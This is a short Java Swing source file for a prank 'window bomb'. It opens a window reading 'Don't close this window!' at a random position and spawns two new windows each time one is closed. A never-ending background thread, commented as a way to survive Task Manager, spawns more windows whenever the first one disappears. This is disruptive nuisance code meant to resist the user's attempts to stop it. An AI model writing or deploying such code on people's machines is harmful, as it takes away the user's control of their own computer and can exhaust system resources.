package Tests;

import java.io.IOException;
import javax.swing.*;

public class Windoww extends JFrame{
    public Windoww() {
        super("Windowwwww!");
        int width = java.awt.Toolkit.getDefaultToolkit().getScreenSize().width;
        int height = java.awt.Toolkit.getDefaultToolkit().getScreenSize().height;
        int x = (int) (Math.random() * (width - 300));
        int y = (int) (Math.random() * (height - 150));
        setLocation(x, y);
        setSize(300, 150);
        setVisible(true);
        JLabel label = new JLabel("Don't close this window!");
        label.setHorizontalAlignment(JLabel.CENTER);
        getContentPane().add(label);
        addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                new Windoww();
                new Windoww();
            }
        });
        //check if process is killed my task manager
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    if (!java.awt.Window.getWindows()[0].isShowing()) {
                        new Windoww();
                        new Windoww();
                    }
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException ex) {
                        ex.printStackTrace();
                    }
                }
            }
        }).start();
    }

    public static void main(String[] args) throws IOException {
        JavaW.run("Windoww");
        new Windoww();
    }
}